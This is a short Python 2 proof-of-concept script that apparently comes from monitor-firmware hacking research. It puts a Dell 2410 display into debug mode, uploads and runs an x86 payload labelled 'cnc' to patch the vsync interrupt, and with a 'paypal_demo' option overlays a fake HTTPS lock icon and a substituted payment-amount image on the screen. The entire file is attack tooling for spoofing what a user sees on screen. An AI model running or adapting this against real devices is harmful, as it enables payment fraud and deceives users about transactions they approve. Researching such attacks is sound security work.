#!/usr/bin/python2
import protocol
import delltools
import time
from payload import X86Payload
from image import DellImage, get_control_struct
import argparse

ARGS = [
    {
        'args': ('--paypal_demo', '-p'),
        'kwargs': {
            'action': 'store_true',
            'help': "do the paypal_demo"
        },
    }

]


parser = argparse.ArgumentParser(description='patch vsync interrupt')
for arg in ARGS:
    parser.add_argument(*arg['args'], **arg['kwargs'])

args = parser.parse_args()

payload = X86Payload("cnc")
dell = protocol.Dell2410()
dell.initialize()
dell.debug_on()

if args.paypal_demo:
    lock_image = DellImage("lock_https.gif")
    lock_metainfo, _ = delltools.upload_single_image(dell, lock_image, 0x600000)
    delltools.put_image(dell, lock_metainfo, 0x63, 0x4a)
    time.sleep(2)
    # put default image
    amount_image = DellImage("amount_image.png", 255 - lock_image.colors)
    amount_metainfo, _ = delltools.upload_single_image(dell, amount_image, 0x600000,
                                                       clut_offset=lock_image.colors)
    delltools.put_image(dell, amount_metainfo, 134, 330, sdram_loc=0x1000 >> 6,
                        tile=1)


delltools.execute_payload(dell, payload, 0x6000)
dell.debug_off()
